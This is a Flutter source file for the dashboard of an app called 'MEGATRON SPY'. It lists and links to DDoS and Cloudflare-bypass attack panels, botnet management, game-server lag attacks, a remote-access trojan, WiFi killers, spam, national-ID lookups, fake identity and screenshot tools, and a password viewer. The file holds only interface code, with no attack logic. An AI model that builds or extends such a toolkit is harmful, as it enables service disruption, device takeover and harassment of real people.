import 'package:flutter/material.dart';
import 'package:darkverse/theme/app_theme.dart';
import 'manage_server.dart';
import 'wifi_internal.dart';
import 'wifi_external.dart';
import 'ddos_panel.dart';
import 'nik_check.dart';
import 'tiktok_page.dart';
import 'instagram_page.dart';
import 'qr_gen.dart';
import 'domain_page.dart';
import 'spam_ngl.dart';
import 'anime.dart';
import 'hentai_page.dart' as hentai;

import 'FreeFireLagServer.dart';
import 'mlbb_lag_page.dart';
import 'encryption_base64.dart';
import 'iqc_page.dart';
import 'comic.dart';
import 'ddos_cloudflare.dart';
import 'tourl.dart';
import 'converter_page.dart';
import 'ai_page.dart';
import 'fake_identity.dart';
import 'whois_page.dart';
import 'web_scanner.dart';
import 'tiktok_booster.dart';
import 'ip_geo.dart';
import 'speed_test.dart';
import 'build_apk_page.dart';
import 'password_check_page.dart';
import 'source_grabber_page.dart';
import 'vuln_scanner_page.dart';
import 'broadcast_page.dart';

import 'rat/rat_client.dart';
import 'rat/rat_device_list_page.dart';

class ToolsPage extends StatelessWidget {
  final String sessionKey;
  final String userRole;
  final String username;
  final List<Map<String, dynamic>> listDoos;

  const ToolsPage({
    super.key,
    required this.sessionKey,
    required this.userRole,
    required this.username,
    required this.listDoos,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      color: Colors.white,
      child: SafeArea(
        child: ListView(
          padding: const EdgeInsets.all(12),
          children: [
            _buildHeader(),
            const SizedBox(height: 16),
            _buildStatBar(),
            const SizedBox(height: 20),
            _buildSectionLabel("ATTACK & INFRASTRUCTURE"),
            const SizedBox(height: 10),
            _buildToolsGrid([
              _buildToolCard(
                context: context,
                icon: Icons.flash_on,
                label: "Attack Panel",
                badge: "LIVE",
                badgeColor: AppTheme.coral,
                desc: "Launch & monitor attacks",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => AttackPanel(sessionKey: sessionKey, listDoos: listDoos))),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.dns,
                label: "Manage Server",
                desc: "Control your botnet nodes",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => ManageServerPage(keyToken: sessionKey))),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.cloud_off,
                label: "DDoS Cloudflare",
                badge: "NEW",
                badgeColor: AppTheme.sky,
                desc: "Bypass CF & DDoS attack",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const DDoSCloudflarePage())),
              ),
            ]),
            const SizedBox(height: 22),
            _buildSectionLabel("GAME TOOLS"),
            const SizedBox(height: 10),
            _buildToolsGrid([
              _buildToolCard(
                context: context,
                icon: Icons.sports_esports,
                label: "Free Fire Lag",
                badge: "GAME",
                badgeColor: AppTheme.peach,
                desc: "Lag server Free Fire",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const FreeFireLagServerPage())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.games,
                label: "MLBB Lag",
                badge: "GAME",
                badgeColor: AppTheme.sky,
                desc: "Lag server Mobile Legends",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => MlbbLagPage(sessionKey: sessionKey))),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.phone_android,
                label: "MEGATRON",
                badge: "RAT",
                badgeColor: AppTheme.coral,
                desc: "Remote access & device control",
                onTap: () {
                  final client = RatClient(sessionKey);
                  Navigator.push(context, MaterialPageRoute(builder: (_) => RatDeviceListPage(client: client)));
                },
              ),
            ]),
            const SizedBox(height: 22),
            _buildSectionLabel("NETWORK & WIFI"),
            const SizedBox(height: 10),
            _buildToolsGrid([
              _buildToolCard(
                context: context,
                icon: Icons.newspaper_outlined,
                label: "Spam NGL",
                badge: "NEW",
                badgeColor: AppTheme.mint,
                desc: "Send anonymous messages",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const NglPage())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.wifi_off,
                label: "WiFi Killer",
                desc: "Internal network disruptor",
                subLabel: "Internal",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => WifiInternalPage(sessionKey: sessionKey))),
              ),
              if (['developer', 'all_akses', 'owner', 'vip'].contains(userRole))
                _buildToolCard(
                  context: context,
                  icon: Icons.router,
                  label: "WiFi Killer",
                  badge: "VIP",
                  badgeColor: AppTheme.gold,
                  desc: "External network attack",
                  subLabel: "External",
                  onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const WifiKillerPage())),
                ),
              _buildToolCard(
                context: context,
                icon: Icons.speed,
                label: "Speed Test",
                desc: "Test ping & internet speed",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const SpeedTestPage())),
              ),
            ]),
            const SizedBox(height: 22),
            _buildSectionLabel("OSINT & SECURITY"),
            const SizedBox(height: 10),
            _buildToolsGrid([
              _buildToolCard(
                context: context,
                icon: Icons.badge,
                label: "NIK Detail",
                desc: "Lookup KTP information",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const NikCheckerPage())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.domain,
                label: "Domain OSINT",
                desc: "Domain reconnaissance",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const DomainOsintPage())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.manage_search,
                label: "WHOIS Lookup",
                desc: "Domain registration info",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const WhoisPage())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.location_searching,
                label: "IP Geolocation",
                desc: "Trace IP location & ISP",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const IpGeoPage())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.shield,
                label: "Vuln Scanner",
                badge: "AI",
                badgeColor: AppTheme.coral,
                desc: "Scan kerentanan website",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const VulnScannerPage())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.search,
                label: "Web Scanner",
                desc: "Website security scanner",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const WebScannerPage())),
              ),
            ]),
            const SizedBox(height: 22),
            _buildSectionLabel("SOCIAL MEDIA"),
            const SizedBox(height: 10),
            _buildToolsGrid([
              _buildToolCard(
                context: context,
                icon: Icons.video_library,
                label: "TikTok Downloader",
                desc: "Save videos without watermark",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const TiktokDownloaderPage())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.camera_alt,
                label: "Instagram Downloader",
                desc: "Reels, stories & posts",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const InstagramDownloaderPage())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.flash_on,
                label: "TikTok Booster",
                badge: "VIP",
                badgeColor: AppTheme.coral,
                desc: "Boost followers & likes",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => TiktokBoosterPage(sessionKey: sessionKey))),
              ),
            ]),
            const SizedBox(height: 22),
            _buildSectionLabel("WEB TOOLS"),
            const SizedBox(height: 10),
            _buildToolsGrid([
              _buildToolCard(
                context: context,
                icon: Icons.code,
                label: "Source Grabber",
                badge: "NEW",
                badgeColor: AppTheme.mint,
                desc: "Ambil source code website",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const SourceGrabberPage())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.qr_code,
                label: "QR Generator",
                desc: "Create custom QR codes",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const QrGeneratorPage())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.upload_file,
                label: "Upload Media",
                desc: "Upload ke Catbox & get URI",
                onTap: () {
                  Navigator.push(context, MaterialPageRoute(builder: (_) => CatboxUploaderPage(username: sessionKey, role: userRole, totalTools: listDoos.length)));
                },
              ),
            ]),
            const SizedBox(height: 22),
            _buildSectionLabel("UTILITIES"),
            const SizedBox(height: 10),
            _buildToolsGrid([
              _buildToolCard(
                context: context,
                icon: Icons.bolt,
                label: "HoxtenAI",
                badge: "AI",
                badgeColor: AppTheme.lavender,
                desc: "AI assistant with Groq",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => AIPage(username: sessionKey, sessionKey: sessionKey))),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.code,
                label: "Base64 Encrypt",
                desc: "Encode & decode Base64",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const EncryptionRavenClawx())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.calculate,
                label: "Converter",
                desc: "Currency & unit converter",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const ConverterPage())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.person_add_alt_1,
                label: "Fake Identity",
                desc: "Generate dummy identity",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const FakeIdentityPage())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.psychology,
                label: "IQC Screenshot",
                desc: "Create WhatsApp screenshot",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const IQCScreen())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.lock_open_rounded,
                label: "Check Password",
                badge: "ACC",
                badgeColor: AppTheme.coral,
                desc: "Lihat password akun",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => PasswordCheckPage(sessionKey: sessionKey, username: username))),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.android_rounded,
                label: "Build APK",
                badge: "DEV",
                badgeColor: AppTheme.mint,
                desc: "Compile & share APK",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => BuildApkPage(sessionKey: sessionKey, username: username))),
              ),
              if (userRole == 'developer')
                _buildToolCard(
                  context: context,
                  icon: Icons.campaign,
                  label: "Broadcast",
                  badge: "DEV",
                  badgeColor: AppTheme.gold,
                  desc: "Kirim notifikasi ke semua user",
                  onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => BroadcastPage(sessionKey: sessionKey))),
                ),
            ]),
            const SizedBox(height: 22),
            _buildSectionLabel("ENTERTAINMENT"),
            const SizedBox(height: 10),
            _buildToolsGrid([
              _buildToolCard(
                context: context,
                icon: Icons.live_tv,
                label: "Anime Streaming",
                desc: "Watch anime for free",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const HomeAnimePage())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.local_fire_department,
                label: "Hentai Media",
                badge: "18+",
                badgeColor: AppTheme.coral,
                desc: "Adult content library",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const hentai.HomeScreen())),
              ),
              _buildToolCard(
                context: context,
                icon: Icons.book,
                label: "Comic Reader",
                desc: "Read comics online",
                onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => const ComicPage())),
              ),
            ]),
            const SizedBox(height: 28),
            _buildFooter(),
            const SizedBox(height: 20),
          ],
        ),
      ),
    );
  }

  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.white,
        border: Border.all(color: Colors.black, width: 3),
        boxShadow: const [BoxShadow(color: Colors.black, offset: Offset(5, 5), blurRadius: 0)],
      ),
      child: Column(
        children: [
          Row(
            children: [
              Container(
                width: 48,
                height: 48,
                decoration: BoxDecoration(
                  color: const Color(0xFF007AFF),
                  border: Border.all(color: Colors.black, width: 3),
                ),
                child: const Icon(Icons.shield, color: Colors.white, size: 24),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text(
                      "MEGATRON SPY",
                      style: TextStyle(
                        color: Colors.black,
                        fontSize: 20,
                        fontWeight: FontWeight.w900,
                        fontFamily: 'Courier',
                        letterSpacing: 2,
                      ),
                    ),
                    const SizedBox(height: 2),
                    Text(
                      "TOOLS DASHBOARD",
                      style: TextStyle(
                        color: Colors.black.withValues(alpha: 0.5),
                        fontSize: 10,
                        fontFamily: 'Courier',
                        letterSpacing: 2,
                        fontWeight: FontWeight.w700,
                      ),
                    ),
                  ],
                ),
              ),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
                decoration: BoxDecoration(
                  color: const Color(0xFF39FF14),
                  border: Border.all(color: Colors.black, width: 2),
                ),
                child: Text(
                  userRole.toUpperCase(),
                  style: const TextStyle(color: Colors.black, fontSize: 10, fontWeight: FontWeight.w900, fontFamily: 'Courier', letterSpacing: 1),
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          Row(
            children: [
              _buildHeaderStat(icon: Icons.flash_on, value: "${listDoos.length}", label: "Methods", color: const Color(0xFFFFE74C)),
              _buildHeaderStat(icon: Icons.grid_view, value: "34", label: "Tools", color: const Color(0xFF007AFF)),
              _buildHeaderStat(icon: Icons.lock_outline, value: "4", label: "Locked", color: const Color(0xFFFF3B30)),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildHeaderStat({
    required IconData icon,
    required String value,
    required String label,
    required Color color,
  }) {
    return Expanded(
      child: Container(
        margin: const EdgeInsets.symmetric(horizontal: 3),
        padding: const EdgeInsets.symmetric(vertical: 10),
        decoration: BoxDecoration(
          color: color,
          border: Border.all(color: Colors.black, width: 2),
        ),
        child: Column(
          children: [
            Icon(icon, color: Colors.black, size: 16),
            const SizedBox(height: 4),
            Text(value, style: const TextStyle(color: Colors.black, fontSize: 18, fontWeight: FontWeight.w900, fontFamily: 'Courier')),
            Text(label, style: TextStyle(color: Colors.black.withValues(alpha: 0.6), fontSize: 8, fontFamily: 'Courier', letterSpacing: 1, fontWeight: FontWeight.w700)),
          ],
        ),
      ),
    );
  }

  Widget _buildStatBar() {
    return Row(
      children: [
        _buildStatChip(icon: Icons.bolt, label: "${listDoos.length} Methods", color: const Color(0xFF39FF14)),
        const SizedBox(width: 8),
        _buildStatChip(icon: Icons.shield_outlined, label: userRole.toUpperCase(), color: const Color(0xFFFFE74C)),
        const SizedBox(width: 8),
        _buildStatChip(icon: Icons.update, label: "v2.0", color: const Color(0xFF007AFF)),
      ],
    );
  }

  Widget _buildStatChip({
    required IconData icon,
    required String label,
    required Color color,
  }) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 10),
        decoration: BoxDecoration(
          color: color,
          border: Border.all(color: Colors.black, width: 2),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(icon, color: Colors.black, size: 13),
            const SizedBox(width: 6),
            Flexible(
              child: Text(
                label,
                style: const TextStyle(color: Colors.black, fontSize: 9, fontFamily: 'Courier', fontWeight: FontWeight.w900, letterSpacing: 0.5),
                overflow: TextOverflow.ellipsis,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSectionLabel(String text) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
      decoration: BoxDecoration(
        color: Colors.black,
        border: Border.all(color: Colors.black, width: 2),
      ),
      child: Row(
        children: [
          Container(
            width: 8,
            height: 8,
            color: const Color(0xFF39FF14),
          ),
          const SizedBox(width: 10),
          Text(
            text,
            style: const TextStyle(
              color: Colors.white,
              fontSize: 12,
              fontWeight: FontWeight.w900,
              fontFamily: 'Courier',
              letterSpacing: 2,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildToolsGrid(List<Widget> children) {
    return Column(children: children);
  }

  Widget _buildToolCard({
    required BuildContext context,
    required IconData icon,
    required String label,
    String? subLabel,
    String? desc,
    String? badge,
    Color? badgeColor,
    bool locked = false,
    required VoidCallback onTap,
  }) {
    final Color accentColor = locked ? Colors.grey.shade400 : (badgeColor ?? const Color(0xFF007AFF));

    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: GestureDetector(
        onTap: locked ? null : onTap,
        child: Container(
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: locked ? Colors.grey.shade200 : Colors.white,
            border: Border.all(color: Colors.black, width: 3),
            boxShadow: locked ? [] : const [BoxShadow(color: Colors.black, offset: Offset(3, 3), blurRadius: 0)],
          ),
          child: Row(
            children: [
              Container(
                width: 44,
                height: 44,
                decoration: BoxDecoration(
                  color: accentColor,
                  border: Border.all(color: Colors.black, width: 2),
                ),
                child: Icon(icon, color: Colors.black, size: 20),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Row(
                      children: [
                        Flexible(
                          child: Text(
                            label,
                            style: TextStyle(
                              color: locked ? Colors.grey : Colors.black,
                              fontSize: 13,
                              fontWeight: FontWeight.w900,
                              fontFamily: 'Courier',
                            ),
                            maxLines: 1,
                            overflow: TextOverflow.ellipsis,
                          ),
                        ),
                        if (subLabel != null) ...[
                          const SizedBox(width: 6),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 5, vertical: 1),
                            decoration: BoxDecoration(
                              color: Colors.grey.shade200,
                              border: Border.all(color: Colors.black, width: 1),
                            ),
                            child: Text(subLabel, style: TextStyle(color: Colors.black, fontSize: 7, fontFamily: 'Courier', fontWeight: FontWeight.w700)),
                          ),
                        ],
                      ],
                    ),
                    const SizedBox(height: 3),
                    Text(
                      desc ?? "",
                      style: TextStyle(color: locked ? Colors.grey : Colors.black54, fontSize: 10, fontFamily: 'Courier'),
                      maxLines: 1,
                      overflow: TextOverflow.ellipsis,
                    ),
                  ],
                ),
              ),
              const SizedBox(width: 8),
              Column(
                crossAxisAlignment: CrossAxisAlignment.end,
                children: [
                  if (badge != null)
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                      decoration: BoxDecoration(color: accentColor, border: Border.all(color: Colors.black, width: 2)),
                      child: Text(badge, style: const TextStyle(color: Colors.black, fontSize: 8, fontWeight: FontWeight.w900, fontFamily: 'Courier')),
                    ),
                  if (badge == null) const SizedBox(height: 20),
                  const SizedBox(height: 4),
                  if (locked)
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                      decoration: BoxDecoration(color: Colors.grey.shade300, border: Border.all(color: Colors.black, width: 1)),
                      child: Row(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          const Icon(Icons.lock_outline, color: Colors.black54, size: 8),
                          const SizedBox(width: 3),
                          Text("LOCKED", style: TextStyle(color: Colors.grey, fontSize: 7, fontFamily: 'Courier', fontWeight: FontWeight.w700)),
                        ],
                      ),
                    )
                  else
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                      decoration: BoxDecoration(color: const Color(0xFF39FF14), border: Border.all(color: Colors.black, width: 1)),
                      child: const Text("OPEN", style: TextStyle(color: Colors.black, fontSize: 7, fontFamily: 'Courier', fontWeight: FontWeight.w900)),
                    ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildMiniBadge(String text, {required Color color}) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
      decoration: BoxDecoration(
        color: color,
        border: Border.all(color: Colors.black, width: 2),
      ),
      child: Text(text, style: const TextStyle(color: Colors.black, fontSize: 7, fontWeight: FontWeight.w900, fontFamily: 'Courier')),
    );
  }

  Widget _buildFooter() {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 20),
      decoration: BoxDecoration(
        color: const Color(0xFF007AFF),
        border: Border.all(color: Colors.black, width: 3),
        boxShadow: const [BoxShadow(color: Colors.black, offset: Offset(4, 4), blurRadius: 0)],
      ),
      child: Column(
        children: [
          const Text(
            "MEGATRON SPY",
            style: TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.w900, fontFamily: 'Courier', letterSpacing: 3),
          ),
          const SizedBox(height: 4),
          Text(
            "Powered by MEGATRON Team",
            style: TextStyle(color: Colors.white.withValues(alpha: 0.7), fontSize: 9, fontFamily: 'Courier'),
          ),
        ],
      ),
    );
  }

  void _showComingSoon(BuildContext context) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: Colors.white,
        shape: RoundedRectangleBorder(
          side: const BorderSide(color: Colors.black, width: 3),
          borderRadius: BorderRadius.zero,
        ),
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              color: const Color(0xFFFFE74C),
              child: const Icon(Icons.lock_clock, color: Colors.black, size: 20),
            ),
            const SizedBox(width: 10),
            const Text("COMING SOON", style: TextStyle(color: Colors.black, fontWeight: FontWeight.w900, fontFamily: 'Courier', fontSize: 16)),
          ],
        ),
        content: const Text(
          "Fitur ini masih dalam tahap pengembangan.\nNantikan update selanjutnya.",
          style: TextStyle(color: Colors.black54, fontSize: 12, fontFamily: 'Courier'),
        ),
        actions: [
          Container(
            color: Colors.black,
            child: TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text("OK", style: TextStyle(color: Color(0xFF39FF14), fontWeight: FontWeight.w900, fontFamily: 'Courier')),
            ),
          ),
        ],
      ),
    );
  }
}
